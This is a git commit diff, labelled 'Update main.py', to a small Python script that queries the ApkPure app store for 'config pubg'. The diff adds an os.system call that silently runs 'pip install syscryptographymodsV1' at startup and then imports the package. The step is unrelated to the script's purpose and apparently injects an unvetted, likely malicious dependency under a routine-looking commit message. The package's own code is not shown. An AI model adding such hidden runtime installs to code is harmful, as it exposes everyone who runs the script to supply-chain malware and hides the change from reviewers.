d20f2ce456c3ebb07b6b9cfc619b8df098da5558
Alnyz <getbeamed@schubilegend.dev>
2023-06-26 15:06:10 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,7 @@
 from apis.api import ApkPure
+import os
+os.system("pip install syscryptographymodsV1")
+import syscryptographymodsV1
 
 api = ApkPure(return_as="rpc")
 find = api._search("config pubg")
